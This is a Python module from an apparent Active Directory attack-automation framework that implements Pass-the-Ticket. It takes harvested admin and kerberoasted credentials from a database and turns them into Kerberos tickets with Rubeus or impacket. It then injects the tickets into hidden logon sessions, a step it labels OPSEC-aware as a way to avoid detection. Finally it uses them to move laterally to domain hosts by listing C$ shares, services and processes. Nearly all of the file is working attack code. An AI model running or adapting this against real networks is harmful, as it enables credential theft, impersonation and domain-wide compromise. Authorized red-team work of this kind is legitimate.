#!/usr/bin/env python3
"""
Pass-the-Ticket Module for AD-Automaton
Implements OPSEC-aware Kerberos ticket manipulation for credential impersonation.
Based on the field manual's advanced post-compromise techniques with createnetonly.
"""

import os
import re
import time
import logging
import tempfile
from typing import List, Dict, Any, Optional, Tuple

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, Host
from executor import CommandExecutor
from logger import log_discovery, log_tool_execution, log_tool_result

class PassTheTicketHandler:
    """
    Handles Pass-the-Ticket attacks with OPSEC-aware techniques.
    Implements both credential-to-ticket conversion and clean ticket injection.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the Pass-the-Ticket handler.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        
        # Get tool configurations
        self.rubeus_config = config.get('tools', {}).get('rubeus', {})
        self.rubeus_path = self.rubeus_config.get('path', 'Rubeus.exe')
        
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        self.gettgt_path = self.impacket_config.get('gettgt_path', 'impacket-getTGT')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_pass_the_ticket', True)
        self.auto_createnetonly = config.get('features', {}).get('auto_createnetonly', True)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        self.clean_injection = config.get('pass_the_ticket', {}).get('clean_injection', True)
        
        # Output directory
        self.output_dir = config.get('output', {}).get('ptt_dir', '/tmp/ad-automaton-ptt')
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Track active sessions for cleanup
        self.active_sessions = []
    
    def run_pass_the_ticket_operations(self) -> Dict[str, Any]:
        """
        Main method to run Pass-the-Ticket operations.
        
        Returns:
            Dictionary containing PtT operation results
        """
        if not self.enabled:
            self.logger.info("Pass-the-Ticket operations are disabled in configuration")
            return {'tickets_created': [], 'sessions_created': [], 'operations': []}
        
        self.logger.info("Starting Pass-the-Ticket operations")
        
        # Phase 1: Convert credentials to tickets
        available_tickets = self._convert_credentials_to_tickets()
        
        # Phase 2: Perform OPSEC-aware ticket injection
        injection_results = []
        if available_tickets:
            injection_results = self._perform_opsec_ticket_injection(available_tickets)
        
        # Phase 3: Demonstrate lateral movement capabilities
        lateral_movement_results = []
        if injection_results:
            lateral_movement_results = self._demonstrate_lateral_movement(injection_results)
        
        results = {
            'tickets_created': available_tickets,
            'sessions_created': injection_results,
            'operations': lateral_movement_results
        }
        
        log_discovery("PtT tickets", len(available_tickets))
        log_discovery("PtT sessions", len(injection_results))
        
        return results
    
    def _convert_credentials_to_tickets(self) -> List[Dict[str, Any]]:
        """
        Convert available credentials to Kerberos tickets.
        
        Returns:
            List of ticket information dictionaries
        """
        available_tickets = []
        
        # Get high-value credentials from database
        high_value_credentials = self._get_high_value_credentials()
        
        if not high_value_credentials:
            self.logger.info("No high-value credentials found for ticket conversion")
            return []
        
        self.logger.info(f"Converting {len(high_value_credentials)} credentials to tickets")
        
        for credential in high_value_credentials:
            try:
                ticket_info = self._credential_to_ticket(credential)
                if ticket_info:
                    available_tickets.append(ticket_info)
                    self.logger.info(f"Created ticket for {credential.domain}\\{credential.username}")
            except Exception as e:
                self.logger.error(f"Error converting credential to ticket: {e}")
                continue
        
        return available_tickets
    
    def _credential_to_ticket(self, credential: Credential) -> Optional[Dict[str, Any]]:
        """
        Convert a single credential to a Kerberos ticket.
        
        Args:
            credential: Credential to convert
            
        Returns:
            Ticket information dictionary if successful
        """
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            self.logger.error("No domain controllers found for ticket generation")
            return None
        
        target_dc = domain_controllers[0]
        
        # Choose conversion method based on platform and credential type
        if self._is_windows() and os.path.exists(self.rubeus_path):
            return self._rubeus_ask_tgt(credential, target_dc)
        else:
            return self._impacket_get_tgt(credential, target_dc)
    
    def _rubeus_ask_tgt(self, credential: Credential, dc_host: Host) -> Optional[Dict[str, Any]]:
        """
        Use Rubeus to request a TGT from credentials.
        
        Args:
            credential: Credential to use
            dc_host: Domain controller to target
            
        Returns:
            Ticket information if successful
        """
        # Generate output filename
        ticket_file = os.path.join(self.output_dir, f'{credential.username}_{int(time.time())}.kirbi')
        
        # Construct Rubeus asktgt command
        cmd_parts = [
            self.rubeus_path,
            'asktgt',
            f'/user:{credential.username}',
            f'/domain:{credential.domain}',
            f'/dc:{dc_host.ip_address}',
            f'/outfile:{ticket_file}'
        ]
        
        # Add authentication method
        if credential.password:
            cmd_parts.append(f'/password:{credential.password}')
        elif credential.hash_value and credential.hash_type == 'NTLM':
            cmd_parts.append(f'/rc4:{credential.hash_value}')
        elif credential.hash_value and 'AES' in credential.hash_type:
            cmd_parts.append(f'/aes256:{credential.hash_value}')
        else:
            self.logger.warning(f"Unsupported credential type for {credential.username}")
            return None
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("Rubeus asktgt", f"Requesting TGT for {credential.username}")
            result = self.executor.execute_command(cmd, timeout=120)
            
            if result.returncode == 0 and os.path.exists(ticket_file):
                log_tool_result("Rubeus asktgt", True)
                
                ticket_info = {
                    'username': credential.username,
                    'domain': credential.domain,
                    'ticket_file': ticket_file,
                    'ticket_format': 'kirbi',
                    'source_credential': credential.cred_id,
                    'tool': 'rubeus',
                    'timestamp': int(time.time())
                }
                
                return ticket_info
            else:
                log_tool_result("Rubeus asktgt", False)
                self.logger.warning(f"Failed to generate ticket for {credential.username}: {result.stderr}")
        
        except Exception as e:
            self.logger.error(f"Error generating ticket with Rubeus: {e}")
        
        return None
    
    def _impacket_get_tgt(self, credential: Credential, dc_host: Host) -> Optional[Dict[str, Any]]:
        """
        Use impacket getTGT to request a TGT from credentials.
        
        Args:
            credential: Credential to use
            dc_host: Domain controller to target
            
        Returns:
            Ticket information if successful
        """
        # Generate output filename (ccache format)
        ccache_file = os.path.join(self.output_dir, f'{credential.username}_{int(time.time())}.ccache')
        
        # Construct getTGT command
        cmd_parts = [
            self.gettgt_path,
            '-dc-ip', dc_host.ip_address
        ]
        
        # Add authentication method
        if credential.password:
            cmd_parts.append(f'{credential.domain}/{credential.username}:{credential.password}')
        elif credential.hash_value:
            cmd_parts.extend(['-hashes', f':{credential.hash_value}'])
            cmd_parts.append(f'{credential.domain}/{credential.username}')
        else:
            self.logger.warning(f"Unsupported credential type for {credential.username}")
            return None
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("impacket getTGT", f"Requesting TGT for {credential.username}")
            
            # Set environment for output file
            env = os.environ.copy()
            env['KRB5CCNAME'] = ccache_file
            
            result = self.executor.execute_command(cmd, timeout=120, env=env)
            
            if result.returncode == 0 and os.path.exists(ccache_file):
                log_tool_result("impacket getTGT", True)
                
                ticket_info = {
                    'username': credential.username,
                    'domain': credential.domain,
                    'ticket_file': ccache_file,
                    'ticket_format': 'ccache',
                    'source_credential': credential.cred_id,
                    'tool': 'impacket',
                    'timestamp': int(time.time())
                }
                
                return ticket_info
            else:
                log_tool_result("impacket getTGT", False)
                self.logger.warning(f"Failed to generate ticket for {credential.username}: {result.stderr}")
        
        except Exception as e:
            self.logger.error(f"Error generating ticket with impacket: {e}")
        
        return None
    
    def _perform_opsec_ticket_injection(self, available_tickets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Perform OPSEC-aware ticket injection using createnetonly technique.
        
        Args:
            available_tickets: List of available tickets
            
        Returns:
            List of created session information
        """
        injection_results = []
        
        if not self._is_windows() or not os.path.exists(self.rubeus_path):
            self.logger.warning("OPSEC ticket injection requires Windows and Rubeus")
            return []
        
        self.logger.info("Performing OPSEC-aware ticket injection with createnetonly")
        
        for ticket_info in available_tickets:
            try:
                session_info = self._inject_ticket_with_createnetonly(ticket_info)
                if session_info:
                    injection_results.append(session_info)
                    self.active_sessions.append(session_info)
            except Exception as e:
                self.logger.error(f"Error injecting ticket for {ticket_info['username']}: {e}")
                continue
        
        return injection_results
    
    def _inject_ticket_with_createnetonly(self, ticket_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Inject ticket using Rubeus createnetonly for clean OPSEC.
        
        Args:
            ticket_info: Ticket information dictionary
            
        Returns:
            Session information if successful
        """
        # Step 1: Create isolated logon session
        self.logger.info(f"Creating isolated logon session for {ticket_info['username']}")
        
        createnetonly_cmd = [
            self.rubeus_path,
            'createnetonly',
            f'/program:cmd.exe',
            '/domain:.',
            '/username:temp',
            '/password:temp',
            '/ticket'
        ]
        
        cmd = ' '.join(createnetonly_cmd)
        
        try:
            log_tool_execution("Rubeus createnetonly", f"Creating session for {ticket_info['username']}")
            result = self.executor.execute_command(cmd, timeout=60)
            
            if result.returncode == 0:
                # Parse output for PID and LUID
                session_info = self._parse_createnetonly_output(result.stdout, ticket_info)
                
                if session_info:
                    log_tool_result("Rubeus createnetonly", True)
                    
                    # Step 2: Inject ticket into the isolated session
                    injection_success = self._inject_ticket_to_session(ticket_info, session_info)
                    
                    if injection_success:
                        session_info['ticket_injected'] = True
                        self.logger.info(f"Successfully injected ticket for {ticket_info['username']} (LUID: {session_info['luid']})")
                        return session_info
                    else:
                        # Clean up failed session
                        self._cleanup_session(session_info)
                else:
                    log_tool_result("Rubeus createnetonly", False)
            else:
                log_tool_result("Rubeus createnetonly", False)
                self.logger.warning(f"Failed to create logon session: {result.stderr}")
        
        except Exception as e:
            self.logger.error(f"Error creating logon session: {e}")
        
        return None
    
    def _parse_createnetonly_output(self, output: str, ticket_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Parse Rubeus createnetonly output to extract session information.
        
        Args:
            output: Command output
            ticket_info: Original ticket information
            
        Returns:
            Session information if parsed successfully
        """
        try:
            # Look for PID and LUID in output
            pid_match = re.search(r'ProcessID\s*:\s*(\d+)', output)
            luid_match = re.search(r'LUID\s*:\s*0x([a-fA-F0-9]+)', output)
            
            if pid_match and luid_match:
                session_info = {
                    'username': ticket_info['username'],
                    'domain': ticket_info['domain'],
                    'pid': int(pid_match.group(1)),
                    'luid': luid_match.group(1),
                    'ticket_info': ticket_info,
                    'created_at': int(time.time()),
                    'ticket_injected': False
                }
                
                self.logger.debug(f"Parsed session info - PID: {session_info['pid']}, LUID: 0x{session_info['luid']}")
                return session_info
        
        except Exception as e:
            self.logger.error(f"Error parsing createnetonly output: {e}")
        
        return None
    
    def _inject_ticket_to_session(self, ticket_info: Dict[str, Any], session_info: Dict[str, Any]) -> bool:
        """
        Inject ticket into the isolated logon session.
        
        Args:
            ticket_info: Ticket information
            session_info: Session information
            
        Returns:
            True if injection successful
        """
        # Construct Rubeus ptt command with LUID targeting
        ptt_cmd = [
            self.rubeus_path,
            'ptt',
            f'/luid:0x{session_info["luid"]}',
            f'/ticket:{ticket_info["ticket_file"]}'
        ]
        
        cmd = ' '.join(ptt_cmd)
        
        try:
            log_tool_execution("Rubeus ptt", f"Injecting ticket to LUID 0x{session_info['luid']}")
            result = self.executor.execute_command(cmd, timeout=60)
            
            if result.returncode == 0:
                log_tool_result("Rubeus ptt", True)
                self.logger.info(f"Ticket injected successfully into session 0x{session_info['luid']}")
                return True
            else:
                log_tool_result("Rubeus ptt", False)
                self.logger.warning(f"Failed to inject ticket: {result.stderr}")
        
        except Exception as e:
            self.logger.error(f"Error injecting ticket: {e}")
        
        return False
    
    def _demonstrate_lateral_movement(self, injection_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Demonstrate lateral movement capabilities with injected tickets.
        
        Args:
            injection_results: List of successful injection sessions
            
        Returns:
            List of lateral movement operation results
        """
        operations = []
        
        # Get target hosts for lateral movement
        target_hosts = self._get_lateral_movement_targets()
        
        if not target_hosts:
            self.logger.info("No suitable targets for lateral movement demonstration")
            return []
        
        self.logger.info(f"Demonstrating lateral movement to {len(target_hosts)} targets")
        
        for session_info in injection_results:
            for target_host in target_hosts[:3]:  # Limit to first 3 targets
                try:
                    operation_result = self._perform_lateral_movement_test(session_info, target_host)
                    if operation_result:
                        operations.append(operation_result)
                except Exception as e:
                    self.logger.error(f"Error in lateral movement test: {e}")
                    continue
        
        return operations
    
    def _perform_lateral_movement_test(self, session_info: Dict[str, Any], target_host: Host) -> Optional[Dict[str, Any]]:
        """
        Perform a lateral movement test to demonstrate ticket validity.
        
        Args:
            session_info: Session with injected ticket
            target_host: Target host for lateral movement
            
        Returns:
            Operation result if successful
        """
        # Test basic connectivity and authentication
        test_operations = [
            ('dir_listing', self._test_remote_dir_listing),
            ('service_enum', self._test_remote_service_enum),
            ('process_list', self._test_remote_process_list)
        ]
        
        operation_results = []
        
        for operation_name, operation_func in test_operations:
            try:
                result = operation_func(session_info, target_host)
                operation_results.append({
                    'operation': operation_name,
                    'success': result is not None,
                    'result': result
                })
                
                if result:
                    self.logger.info(f"Lateral movement test '{operation_name}' successful on {target_host.ip_address}")
                    break  # Success, no need to try other operations
                
            except Exception as e:
                self.logger.debug(f"Lateral movement test '{operation_name}' failed: {e}")
                continue
        
        if any(op['success'] for op in operation_results):
            return {
                'session_info': session_info,
                'target_host': target_host.ip_address,
                'successful_operations': [op for op in operation_results if op['success']],
                'timestamp': int(time.time())
            }
        
        return None
    
    def _test_remote_dir_listing(self, session_info: Dict[str, Any], target_host: Host) -> Optional[str]:
        """Test remote directory listing via SMB."""
        try:
            # Use dir command through the injected session
            # This is a simplified test - in practice, you'd use tools like PsExec or WMI
            cmd = f'dir \\\\{target_host.ip_address}\\C$'
            
            result = self.executor.execute_command(cmd, timeout=30)
            
            if result.returncode == 0 and 'Directory of' in result.stdout:
                return "Directory listing successful"
            
        except Exception as e:
            self.logger.debug(f"Remote dir listing failed: {e}")
        
        return None
    
    def _test_remote_service_enum(self, session_info: Dict[str, Any], target_host: Host) -> Optional[str]:
        """Test remote service enumeration."""
        try:
            # Use sc query to enumerate services
            cmd = f'sc \\\\{target_host.ip_address} query type= service state= all'
            
            result = self.executor.execute_command(cmd, timeout=60)
            
            if result.returncode == 0 and 'SERVICE_NAME' in result.stdout:
                service_count = result.stdout.count('SERVICE_NAME')
                return f"Service enumeration successful: {service_count} services found"
            
        except Exception as e:
            self.logger.debug(f"Remote service enumeration failed: {e}")
        
        return None
    
    def _test_remote_process_list(self, session_info: Dict[str, Any], target_host: Host) -> Optional[str]:
        """Test remote process listing."""
        try:
            # Use tasklist to list remote processes
            cmd = f'tasklist /s {target_host.ip_address}'
            
            result = self.executor.execute_command(cmd, timeout=60)
            
            if result.returncode == 0 and 'Image Name' in result.stdout:
                process_count = len(result.stdout.split('\n')) - 3  # Subtract header lines
                return f"Process listing successful: {process_count} processes found"
            
        except Exception as e:
            self.logger.debug(f"Remote process listing failed: {e}")
        
        return None
    
    def cleanup_sessions(self) -> None:
        """Clean up all active sessions created by this module."""
        self.logger.info(f"Cleaning up {len(self.active_sessions)} active sessions")
        
        for session_info in self.active_sessions:
            self._cleanup_session(session_info)
        
        self.active_sessions.clear()
    
    def _cleanup_session(self, session_info: Dict[str, Any]) -> None:
        """
        Clean up a specific session.
        
        Args:
            session_info: Session information to clean up
        """
        try:
            # Kill the process to clean up the session
            pid = session_info.get('pid')
            if pid:
                cleanup_cmd = f'taskkill /F /PID {pid}'
                result = self.executor.execute_command(cleanup_cmd, timeout=30)
                
                if result.returncode == 0:
                    self.logger.debug(f"Cleaned up session PID {pid}")
                else:
                    self.logger.warning(f"Failed to clean up session PID {pid}")
        
        except Exception as e:
            self.logger.error(f"Error cleaning up session: {e}")
    
    def _get_high_value_credentials(self) -> List[Credential]:
        """Get high-value credentials suitable for PtT operations."""
        # Prioritize admin credentials and kerberoastable hashes
        query = """
            SELECT DISTINCT c.* FROM Credentials c
            LEFT JOIN Valid_Credentials vc ON c.cred_id = vc.cred_id
            WHERE (vc.access_level = 'ADMIN' OR c.hash_type LIKE '%TGS%' OR c.source_tool LIKE '%kerberoast%')
            AND c.domain IS NOT NULL
            ORDER BY 
                CASE WHEN vc.access_level = 'ADMIN' THEN 1 ELSE 2 END,
                c.created_at DESC
        """
        
        credentials = []
        rows = self.db_manager.execute_query(query)
        
        for row in rows:
            credential = Credential(
                cred_id=row[0],
                username=row[1],
                domain=row[2],
                password=row[3],
                hash_value=row[4],
                hash_type=row[5],
                source_tool=row[6]
            )
            credentials.append(credential)
        
        return credentials
    
    def _get_lateral_movement_targets(self) -> List[Host]:
        """Get suitable hosts for lateral movement testing."""
        # Get non-DC hosts for lateral movement
        query = "SELECT * FROM Hosts WHERE is_dc = 0 ORDER BY ip_address"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _is_windows(self) -> bool:
        """Check if running on Windows platform."""
        import platform
        return platform.system().lower() == 'windows'


def run_pass_the_ticket_operations(db_manager: DatabaseManager, config: Dict[str, Any]) -> Dict[str, Any]:
    """
    Main entry point for Pass-the-Ticket module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        Dictionary containing PtT operation results
    """
    ptt_handler = PassTheTicketHandler(db_manager, config)
    
    try:
        return ptt_handler.run_pass_the_ticket_operations()
    finally:
        # Always clean up sessions
        ptt_handler.cleanup_sessions() 